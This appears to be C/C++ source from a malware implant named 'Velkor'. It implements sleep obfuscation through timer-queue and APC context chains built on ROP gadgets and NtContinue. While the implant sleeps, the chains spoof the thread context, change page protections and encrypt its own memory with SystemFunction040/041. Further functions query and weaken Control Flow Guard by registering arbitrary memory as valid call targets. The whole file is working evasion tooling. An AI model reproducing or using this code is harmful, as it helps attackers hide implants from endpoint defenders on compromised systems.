#include <Ground.h>
#include <Evasion.h>

D_SEC( B ) VOID XorCipher( PBYTE pBinary, SIZE_T sSize, PBYTE pbKey, SIZE_T sKeySize ) {
    for ( SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++ ) {
        if ( j == sKeySize )
            j = 0x00;

        if ( i % 2 == 0 )
            pBinary[i] = pBinary[i] ^ pbKey[j];
        else
            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
    }
}

D_SEC( B ) VOID SleepMain(
    _In_ ULONG SleepTime
) {
    VELKOR_INSTANCE
        TimerObf( SleepTime );
    return;
    if ( SleepConf.SleepTime == 1 || SleepConf.SleepTime == 0  || SleepConf.SleepMask == VkMaskWait ) {
        VkCall<ULONG>( XprKernel32, XPR( "WaitForSingleObject" ), NtCurrentProcess(), SleepTime );
    } else if ( SleepConf.SleepMask == VkMaskTimer ) {
        TimerObf( SleepTime );
    } else if ( SleepConf.SleepMask == VkMaskApc ) {
        ApcObf( SleepTime );
    }

    return;
}

D_SEC( B ) VOID TimerObf(
    _In_ ULONG SleepTime
) {
#ifndef _M_IX86
    VELKOR_INSTANCE

    NTSTATUS NtStatus = 0;
    
    UINT32 DupThreadId      = VkThread::RndEnum();
    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    HANDLE Queue       = NULL;
    HANDLE Timer       = NULL;
    HANDLE EventTimer  = NULL;
    HANDLE EventStart  = NULL;
    HANDLE EventEnd    = NULL;

    PVOID OldProtection = NULL;
    ULONG DelayTimer    = 0;
    BOOL  bSuccess      = FALSE;

    CONTEXT CtxMain = { 0 };
    CONTEXT CtxSpf  = { 0 };
    CONTEXT CtxBkp  = { 0 };

    CONTEXT Ctx[10]  = { 0 };
    UINT16  ic       = 0;

    BYTE Key[16] = { 0 };

    VkShow( "\n" );
    VkShow( "{DBG} Velkor base    @ 0x%p [0x%X bytes]\n", VelkorMem.Full.Start, VelkorMem.Full.Length );
    VkShow( "{DBG} Velkor rx page @ 0x%p [0x%X bytes]\n", VelkorMem.RxPage.Start, VelkorMem.RxPage.Length );
    VkShow( "{DBG} Velkor rw page @ 0x%p [0x%X bytes]\n\n", VelkorMem.RwPage.Start, VelkorMem.RwPage.Length );

    VkShow( "{OBF} Thread Id to duplicate: %d\n", DupThreadId );
    VkShow( "{OBF} Rbx gadget @ 0x%p\n", SleepConf.JmpGadget );
    VkShow( "{OBF} NtContinue gadget @ 0x%p\n", SleepConf.NtContinueGadget );

    DupThreadHandle = VkThread::Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );

    NtStatus = VkCall<NTSTATUS>( XprKernel32, XPR( "DuplicateHandle" ), NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateEvent" ), &EventTimer,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateEvent" ), &EventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateEvent" ), &EventEnd,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "RtlCreateTimerQueue" ), &Queue );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "RtlCreateTimer" ), Queue, &Timer, (WAITORTIMERCALLBACKFUNC)FuncPtr.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "RtlCreateTimer"), Queue, &Timer, (WAITORTIMERCALLBACKFUNC)FuncPtr.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtWaitForSingleObject" ), EventTimer, FALSE, NULL ); 
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;

    VkCall<VOID>( XprNtdll, XPR( "NtGetContextThread" ), DupThreadHandle, &CtxSpf );

    for ( INT i = 0; i < 10; i++ ) {
        VkMem::Copy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
        Ctx[i].Rsp -= sizeof( PVOID );
    }

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtWaitForSingleObject );
    Ctx[ic].Rcx = U_64( EventStart );
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtGetContextThread );
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget ) ;
    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread ); 
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxSpf );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    Ctx[ic].R8  = PAGE_READWRITE;
    Ctx[ic].R9  = U_64( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction040 );
    Ctx[ic].Rcx = U_64( VelkorMem.Full.Start );
    Ctx[ic].Rdx = VelkorMem.Full.Length;
    ic++;
    
    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.WaitForSingleObjectEx );
    Ctx[ic].Rcx = U_64( NtCurrentProcess() );
    Ctx[ic].Rdx = SleepTime;
    Ctx[ic].R8  = FALSE;
    ic++;
        
    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction041 );
    Ctx[ic].Rcx = U_64( VelkorMem.Full.Start );
    Ctx[ic].Rdx = VelkorMem.Full.Length;
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    Ctx[ic].R8  = PAGE_EXECUTE_READ;
    Ctx[ic].R9  = U_64( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread );
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.SetEvent );
    Ctx[ic].Rcx = U_64( EventEnd );
    ic++;


    for ( INT i = 0; i < 16; i++ ) {
        Key[i] = (BYTE)Random32();
    }    

    // VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );

    for ( INT i = 0; i < ic; i++ ) {
        VkCall<VOID>( XprNtdll, XPR( "RtlCreateTimer" ), Queue, &Timer, SleepConf.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    }

    // VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );

    VkShow( "{OBF} Trigger obf chain\n\n" );

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtSignalAndWaitForSingleObject" ), EventStart, EventEnd, FALSE, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

_VK_LEAVE:
    if ( DupThreadHandle ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), DupThreadHandle );
    if ( Timer           ) VkCall<VOID>( XprNtdll, XPR( "RtlDeleteTimer" ), Queue, Timer, EventTimer );
    if ( Queue           ) VkCall<VOID>( XprNtdll, XPR( "RtlDeleteTimerQueue" ), Queue );
    if ( EventEnd        ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), EventEnd  );
    if ( EventStart      ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), EventStart );
    if ( EventTimer      ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), EventTimer  );
#endif

    return;
}

D_SEC( B ) VOID ApcObf( 
    _In_ ULONG SleepTime
) {
#ifndef _M_IX86
    VELKOR_INSTANCE

    NTSTATUS NtStatus = STATUS_SUCCESS;

    ULONG  DupThreadId      = VkThread::RndEnum();
    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    HANDLE EventSync     = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NtCurrentThread();
    PVOID  OldProtection = NULL;
    HANDLE TempValue     = NULL;

    CONTEXT CtxMain = { 0 };
    CONTEXT CtxBkp  = { 0 };
    CONTEXT CtxSpf  = { 0 };

    UINT16 ic = 0;

    CONTEXT Ctx[12] = { 0 }; // stomp 9 - normal 6

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateEvent" ), &EventSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;    

    NtStatus = VkCall<NTSTATUS>(
        XprNtdll, XPR( "NtCreateThreadEx" ), &hSlpThread, THREAD_ALL_ACCESS, 
        NULL, NtCurrentProcess(), 0, NULL, TRUE, 
        0, 0x1000 * 20, 0x1000 * 20, NULL 
    );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    VkShow( "\n" );
    VkShow( "{DBG} Velkor base    @ 0x%p [0x%X bytes]\n", VelkorMem.Full.Start, VelkorMem.Full.Length );
    VkShow( "{DBG} Velkor rx page @ 0x%p [0x%X bytes]\n", VelkorMem.RxPage.Start, VelkorMem.RxPage.Length );
    VkShow( "{DBG} Velkor rw page @ 0x%p [0x%X bytes]\n\n", VelkorMem.RwPage.Start, VelkorMem.RwPage.Length );

    VkShow( "{OBF} Thread Id to duplicate: %d\n", DupThreadId );
    VkShow( "{OBF} Rbx gadget @ 0x%p\n", SleepConf.JmpGadget );
    VkShow( "{OBF} NtContinue gadget @ 0x%p\n", SleepConf.NtContinueGadget );
    DupThreadHandle = VkThread::Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );
    if ( !DupThreadHandle ) {
        VkShow( "{ERR} error to open thread to duplicate: %d\n", NtLastError() );
    }

    if ( !VkCall<BOOL>( 
            XprNtdll, XPR( "DuplicateHandle" ),
            NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), 
            &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 
        ) 
    ) {
        VkShow( "{ERR} error to duplicate handle: %d\n", NtLastError() ); return;
    }

    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;

    VkCall<NTSTATUS>( XprNtdll, XPR( "NtGetContextThread" ), DupThreadHandle, &CtxSpf );

    CtxMain.ContextFlags = CONTEXT_FULL;
    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtGetContextThread" ), hSlpThread, &CtxMain );
    if ( NtStatus != 0x00 ) goto _VK_LEAVE;

    *(PVOID*)CtxMain.Rsp = FuncPtr.NtTestAlert;

    for ( INT i = 0; i < 12; i++ ) {
        VkMem::Copy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
    }

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtWaitForSingleObject );
    Ctx[ic].Rcx = U_64( EventSync );
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtGetContextThread );
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget ) ;
    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread ); 
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxSpf );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    Ctx[ic].R8  = PAGE_READWRITE;
    Ctx[ic].R9  = U_64( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction040 );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    ic++;
    

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.WaitForSingleObjectEx );
    Ctx[ic].Rcx = U_64( NtCurrentProcess() );
    Ctx[ic].Rdx = SleepTime;
    Ctx[ic].R8  = FALSE;
    ic++;
        
    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction041 );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
    Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
    Ctx[ic].Rdx = VelkorMem.RxPage.Length;
    Ctx[ic].R8  = PAGE_EXECUTE_READ;
    Ctx[ic].R9  = U_64( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread );
    Ctx[ic].Rcx = U_64( MainThreadHandle );
    Ctx[ic].Rdx = U_64( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
    Ctx[ic].Rbx = U_64( &FuncPtr.RtlExitUserThread );
    Ctx[ic].Rcx = 0x00;
    ic++;

    for ( INT i = 0; i < ic; i++ ) {
        VkCall<VOID>( XprNtdll, XPR( "NtQueueApcThread" ), hSlpThread, SleepConf.NtContinueGadget, &Ctx[i], FALSE, NULL );
    }

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtAlertResumeThread" ), hSlpThread, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;

    VkShow( "{OBF} Trigger sleep obf chain\n\n" );

    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtSignalAndWaitForSingleObject" ), EventSync, hSlpThread, FALSE, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _VK_LEAVE;
    
_VK_LEAVE:
    if ( EventSync       ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), EventSync );
    if ( DupThreadHandle ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), DupThreadHandle );

    if ( hSlpThread ) VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), hSlpThread );
    
#endif
}    

D_SEC( B ) BOOL CfgCheckEnabled(
    VOID
) {
    VELKOR_INSTANCE

    NTSTATUS NtStatus = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    NtStatus = ( 
        XprNtdll, XPR("NtQueryInformationProcess"), NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL, &ProcInfoEx, sizeof( ProcInfoEx ), NULL
    );
    if ( NtStatus != STATUS_SUCCESS ) {
        VkShow( "{ERR} failed with status: %X\n", NtStatus );
    }

    VkShow( "{DBG} Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

D_SEC( B ) VOID CfgExceptionAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) {
    VELKOR_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             NtStatus = STATUS_SUCCESS;

    NtHdrs                  = (PIMAGE_NT_HEADERS)C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = PAGE_ALIGN( NtHdrs->OptionalHeader.SizeOfImage );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_64( Function ) - U_64( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    NtStatus = VkCall<NTSTATUS>(
        XprNtdll, XPR( "NtSetInformationVirtualMemory" ), NtCurrentProcess(),
        VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo )
    );

    if ( NtStatus != STATUS_SUCCESS ) {
        VkShow( "{ERR} failed with status: %X", NtStatus );
    }
}

D_SEC( B ) VOID CfgExceptionPrivateAdd(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID  BaseAddress,
    _In_ DWORD  Size
) {
    VELKOR_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             NtStatus = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = BaseAddress;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    NtStatus = VkCall<NTSTATUS>(
        XprNtdll, XPR( "NtSetInformationVirtualMemory" ), ProcessHandle,
        VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) 
    );

    if ( NtStatus != STATUS_SUCCESS ) {
        VkShow( "{ERR} failed with status: %X", NtStatus );
    }
}